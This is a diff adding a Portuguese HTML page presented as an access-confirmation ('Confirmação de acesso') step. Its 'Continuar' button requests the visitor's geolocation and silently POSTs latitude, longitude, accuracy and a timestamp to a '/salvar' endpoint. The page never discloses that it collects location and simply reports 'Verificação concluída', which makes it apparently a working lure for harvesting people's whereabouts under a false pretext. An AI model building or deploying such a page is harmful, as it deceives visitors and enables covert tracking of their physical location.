@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação</title>
+</head>
+<body>
+  <h2>Confirmação de acesso</h2>
+  <button onclick="getLocation()">Continuar</button>
+
+  <script>
+    function getLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocalização não suportada.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            date: new Date().toISOString()
+          };
+
+          await fetch('/salvar', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+
+          alert("Verificação concluída.");
+        },
+        (err) => {
+          alert("Permissão negada.");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
